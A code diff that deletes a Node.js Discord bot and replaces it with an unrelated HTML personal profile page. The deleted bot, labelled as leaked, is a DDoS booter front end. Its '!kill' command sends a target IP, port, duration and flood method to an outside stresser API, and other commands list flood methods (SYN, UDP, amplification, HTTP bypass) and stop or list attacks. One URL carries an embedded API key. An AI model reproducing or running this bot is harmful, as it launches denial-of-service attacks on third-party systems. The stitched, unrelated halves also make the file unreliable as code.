@@ -1,261 +1,85 @@
-const express = require('express');
+<!-- made by @alcoolique & edited by @leuxlentered -->
+<!-- snow.js @ https://codepen.io/massiebn/pen/OJMbXz -->
+<!-- built onto https://wya.lol/$ by @leuxlentered -->
+<!-- changes: added new view counter, fixed and added new container for badges, snow effect, real time discord profile tracker, new svg icons with rewritten css, typewriter effect on bio, fixed css errors + added sound off button to main container-->
+<!-- dm @leuxlentered on discord for src if interested. all template credits to @alcoolique taken from wya.lol -->
+<!DOCTYPE html>
+<html lang="en">
 
-const app = express();
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>𝕷𝖊𝖚𝖝</title>
+    <meta name="theme-color" content="#000001">
+    <link rel="stylesheet" href="public/users/css/cat.css">
+    <link rel="icon" href="public\src\img\1281904753252765717.png" type="image/x-icon">
+    <link rel="shortcut icon" href="public\src\img\1281904753252765717.png" type="image/x-icon"> 
+    <meta content="leux_Lentered Denk j" property="og:title" />
+    <meta content="http://leux.us" property="og:url" />
+    <meta content="https://api.lanyard.rest/1059122727681802301.png" property="og:image" />
+    <meta content="#000001" data-react-helmet="true" name="theme-color" />
+</head>
+<script src="snow.js"></script>
+<script src="effects.js"></script>
+<script src="effects2.js"></script>
+<script src="view.js"></script>
+<body>
 
-app.get('/', (req, res) => {
-  res.send('Hello Express app!')
-});
+    <div id="overlay">
+        <button class="overlaybtn" onclick="removeOverlay()">𝕷𝖊𝖚𝖝</button>
+    </div>
 
-app.listen(3000, () => {
-  console.log('Leaked By : @mich0a');
-});
+    <div id="user-page">
 
-const { Client, Intents } = require('discord.js');
-const { MessageEmbed } = require('discord.js');  
+        <img class="background" src="./leux/3131.png" draggable="false" style="object-fit: cover;">
 
-const intents = new Intents([
-    Intents.FLAGS.GUILDS,
-    Intents.FLAGS.GUILD_MESSAGES,
-    Intents.FLAGS.DIRECT_MESSAGES,
-    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
-]);
+        <div class="main-container" id="mainDiv">
 
-const bot = new Client({ intents });
+            <div class="profile-container">
+                <img class="pp" src="./leux/pp.png" draggable="false">
+                <p class="username breathing" data-tooltip="uid: 1">𝕷𝖊𝖚𝖝</p>
 
-bot.once('ready', () => {
-    console.log('Bot is ready.');
-});
+                <div class="badges-container">
+                    <div class="badges pic-badge" id="prem" data-tooltip="Premium Üye" style="background-image: url('public/src/badges/premium.png');"></div>
+                    <div class="badges pic-badge" id="own" data-tooltip="Site Sahibi" style="background-image: url('public/src/badges/booster.png');" bis_skin_checked="1"></div>
+                    <div class="badges pic-badge" id="early "data-tooltip="Eski Üye" style="background-image: url('public/src/badges/early.png');"></div>
+                </div>
 
-const whitelistedIds = ['', '', '', ''];
-const blacklistedIps = [
-    { ip: "1.1.1.1", port: 80},
-];
+                <div class="bio-container">
+                    <div class="bio typewriter"></div>
+                </div>
+                <div class="pre-container">
+                    <div class="pre">
+                        <div class="cropped">
+                            <img draggable="false" id="rpc">
+                        </div>
+                    </div>
+                </div>
+                <div class="links-container" id="linksDiv">
+                    <div class="logo btc" id="btc" onclick="copyAddress('btc')">                
+<svg viewBox="0 0 24 24" title="leux_1" id="btcInput" class="links" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M18.59 5.88997C17.36 5.31997 16.05 4.89997 14.67 4.65997C14.5 4.95997 14.3 5.36997 14.17 5.69997C12.71 5.47997 11.26 5.47997 9.83001 5.69997C9.69001 5.36997 9.49001 4.95997 9.32001 4.65997C7.94001 4.89997 6.63001 5.31997 5.40001 5.88997C2.92001 9.62997 2.25001 13.28 2.58001 16.87C4.23001 18.1 5.82001 18.84 7.39001 19.33C7.78001 18.8 8.12001 18.23 8.42001 17.64C7.85001 17.43 7.31001 17.16 6.80001 16.85C6.94001 16.75 7.07001 16.64 7.20001 16.54C10.33 18 13.72 18 16.81 16.54C16.94 16.65 17.07 16.75 17.21 16.85C16.7 17.16 16.15 17.42 15.59 17.64C15.89 18.23 16.23 18.8 16.62 19.33C18.19 18.84 19.79 18.1 21.43 16.87C21.82 12.7 20.76 9.08997 18.61 5.88997H18.59ZM8.84001 14.67C7.90001 14.67 7.13001 13.8 7.13001 12.73C7.13001 11.66 7.88001 10.79 8.84001 10.79C9.80001 10.79 10.56 11.66 10.55 12.73C10.55 13.79 9.80001 14.67 8.84001 14.67ZM15.15 14.67C14.21 14.67 13.44 13.8 13.44 12.73C13.44 11.66 14.19 10.79 15.15 10.79C16.11 10.79 16.87 11.66 16.86 12.73C16.86 13.79 16.11 14.67 15.15 14.67Z" fill="#5865f2"></path> </g></svg>
+                        <svg fill="#f7f7f7" class="links" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" xml:space="preserve"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.001.002.001a2.895 2.895 0 0 1 3.183-4.51v-3.5a6.329 6.329 0 0 0-5.394 10.692 6.33 6.33 0 0 0 10.857-4.424V8.687a8.182 8.182 0 0 0 4.773 1.526V6.79a4.831 4.831 0 0 1-1.003-.104z"></path></g></svg>
+                    </div>
+                </div>
 
-function channelCheck(channel) {
-    return channel.id === '1140987090843213826';
-}
+                <div class="linksline"></div>
 
-bot.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
+                <div class="views-container">
+                    <svg viewbox="0 0 24 24" width="25" height="25" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0" style="margin-bottom: -3px;"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M3 14C3 9.02944 7.02944 5 12 5C16.9706 5 21 9.02944 21 14M17 14C17 16.7614 14.7614 19 12 19C9.23858 19 7 16.7614 7 14C7 11.2386 9.23858 9 12 9C14.7614 9 17 11.2386 17 14Z" stroke="#c18be0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
+                    <span id="view-count">236</span>
+                </div>
+            </div>
 
-    if (message.content.startsWith('!kill')) {
-        if (!channelCheck(message.channel)) {
-            const embed = new MessageEmbed()
-                .setTitle("Command Restricted")
-                .setDescription("This command can only be used in <#1139985684514484345> channel.")
-                .setThumbnail(message.author.avatarURL({dynamic: true}))
-                .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }))
-                .setColor('#FF0000');
-            if (message.channel.type === 'DM') {
-                await message.author.send({ embeds: [embed] });
-            } else {
-                await message.reply({ embeds: [embed] });
-            }
-            return;
-        }
+        <div class="mutebutton">
+            <p id="mutetext" onclick="toggleMusic()">Şarkı açık</p>
+        </div>
 
-        const args = message.content.slice('!kill'.length).trim().split(/ +/);
-        const input1 = args[0];
-        const input2 = parseInt(args[1]);
-        const input3 = parseInt(args[2]);
-        const input4 = args[3];
+    </div>
 
-        const targetIp = input1;
-        const targetPort = input2;
+    <audio id="backgroundsong" src="leux/music.mp3" loop=""></audio>
 
-        if (blacklistedIps.some(ip => ip.ip === targetIp && ip.port === targetPort)) {
-            const embed = new MessageEmbed()
-                .setTitle("Blacklisted IP")
-                .setDescription("The target IP address and port combination is blacklisted and cannot be attacked.")
-              .setThumbnail(message.author.avatarURL({dynamic: true}))
-            .setColor('#2F3136')
+</div></body>
 
-            await message.reply({ embeds: [embed] });
-            return;
-        }
+</html>
 
-        const apiURL = `https://gloryrp.fun/api_key=&host=${input1}&port=${input2}&time=${input3}&method=${input4}`;
-        const headers = {
-            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
-        };
-
-        try {
-            const response = await fetch(apiURL, { headers });
-            const responseData = await response.json();
-
-            if (response.ok) {
-                const embed = new MessageEmbed()
-                    .setTitle('Attack Sent')
-                    .setDescription('root@127.0.0.1: CyberSecurity#~ sent attack')
-                    .setColor('#2F3136')
-                    .addField('Target:', `${input1}:${input2}`, true)
-                    .addField('Duration', `${input3} seconds`, true)
-                    .addField('Method', `${input4}`, true)
-                    .setAuthor(message.author.username, message.author.avatarURL())
-                    .setThumbnail(message.author.avatarURL({dynamic: true}))
-                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL({ dynamic: true }));
-              
-                await message.reply({ embeds: [embed] });
-            } else {
-                const embed = new MessageEmbed()
-                    .setTitle('Error')
-                    .setDescription(`error code: ${response.status} - error reason: ${responseData}`)
-                   .setColor('#2F3136');
-
-                await message.reply({ embeds: [embed] });
-            }
-        } catch (error) {
-            const embed = new MessageEmbed()
-                .setTitle('Error')
-                .setDescription(`Error OO9S93Z: ${error}`)
-                .setColor('#2F3136');
-
-            await message.reply({ embeds: [embed] });
-        }
-    }
-});
-
-bot.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-
-    if (message.content === '!methods') {
-        const methodsList = [
-            "TCP-ACK - L4",
-            "TCP-NFO - L4",
-            "TCP-TFO - L4",
-            "TCP-OVHv3 - L4",
-            "TCP-BYPASS - L4",
-            "TCP-SYN - L4",
-            "UDP-RAW - L4",
-            "UDP-RAKNET - L4",
-            "AMP-STUN - L4",
-            "-----------------",
-            "HTTP-SOCKET - L7",
-            "HTTP-CRANK - L7",
-            "HTTP-FLAG - L7",
-            "HTTP-BROWSER - L7",
-            "HTTP-PLUG - L7",
-            "HTTP-BYPASS - L7",
-        ];
-
-        const methodsFormatted = methodsList.map(method => `\`${method}\``).join('\n');
-
-        const embed = new MessageEmbed()
-            .setTitle("CyberSecurity#~ ls")
-            .setDescription("root@127.0.0.1: CyberSecurity#~ showing all methods available")
-            .setColor('#2F3136')
-            .addField("Methods", methodsFormatted, false);
-
-        await message.reply({ embeds: [embed] });
-    }
-});
-
-bot.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-
-    if (message.content.startsWith('!stop')) {
-        const args = message.content.slice('!stop'.length).trim().split(/ +/);
-        const input1 = args[0];
-
-        if (!whitelistedIds.includes(message.author.id)) {
-            const embed = new MessageEmbed()
-                .setTitle("Permission Denied")
-                .setDescription("You don't have permission to run this command.")
-                .setColor('#FF0000');
-
-            await message.reply({ embeds: [embed], ephemeral: true });
-            return;
-        }
-
-        const apiURL = `https://gloryrp.fun/stop?api_key=`;
-        const headers = {
-            'User-Agent': 'Mozila/5.0 (Gloryrp.fun)',
-        };
-
-        try {
-            const response = await fetch(apiURL, { headers });
-
-            if (response.ok) {
-                const embed = new MessageEmbed()
-                    .setTitle('Stopped Attack')
-                    .setDescription('root@127.0.0.1: CyberSecurity#~ attack off')
-                    .setColor('#2F3136')
-                    .addField('Attack ID', input1)
-                    .setAuthor(message.author.username, message.author.avatarURL())
-                    .setTimestamp()
-                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL());
-
-                await message.reply({ embeds: [embed] });
-            } else {
-                const errorText = await response.text();
-                const embed = new MessageEmbed()
-                    .setTitle('Error')
-                    .setDescription(`error code: ${response.status} - error reason: ${errorText}`)
-                    .setColor('#FF0000');
-
-                await message.reply({ embeds: [embed] });
-            }
-        } catch (error) {
-            const embed = new MessageEmbed()
-                .setTitle('Error')
-                .setDescription(`Error OO9S93Z: ${error}`)
-                .setColor('#FF0000');
-
-            await message.reply({ embeds: [embed] });
-        }
-    }
-});
-
-bot.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-
-    if (message.content === '!ids') {
-        if (!whitelistedIds.includes(message.author.id)) {
-            const embed = new MessageEmbed()
-                .setTitle("Permission Denied")
-                .setDescription("You don't have permission to run this command.")
-                .setColor('#FF0000');
-
-            await message.reply({ embeds: [embed], ephemeral: true });
-            return;
-        }
-        const apiURL = 'https://gloryrp.fun/ids?api_key=cRU6-1ktRA-coIO-r13pE&id=';
-        const headers = {
-            'User-Agent': 'Mozila/5.0 (gloryrp.fun)',
-        };
-
-        try {
-            const response = await fetch(apiURL, { headers });
-            const responseData = await response.text(); 
-
-            if (response.ok) {
-                const embed = new MessageEmbed()
-                    .setTitle('All Attack IDs')
-                    .setDescription('root@127.0.0.1: CyberSecurity#~ listing all attacks')
-                    .setColor('#2F3136')
-                    .addField('Attacks', responseData || 'No attack IDs available') 
-                    .setAuthor(message.author.username, message.author.avatarURL())
-                    .setTimestamp()
-                    .setFooter(`Requested by ${message.author.tag}`, message.author.displayAvatarURL());
-
-                await message.reply({ embeds: [embed] });
-            } else {
-                const embed = new MessageEmbed()
-                    .setTitle('Error')
-                    .setDescription(`error code: ${response.status} - error reason: ${responseData}`)
-                    .setColor('#FF0000');
-
-                await message.reply({ embeds: [embed] });
-            }
-        } catch (error) {
-            const embed = new MessageEmbed()
-                .setTitle('Error')
-                .setDescription(`Error OO9S93Z: ${error}`)
-                .setColor('#FF0000');
-
-            await message.reply({ embeds: [embed] });
-        }
-    }
-});
-
-bot.login('')
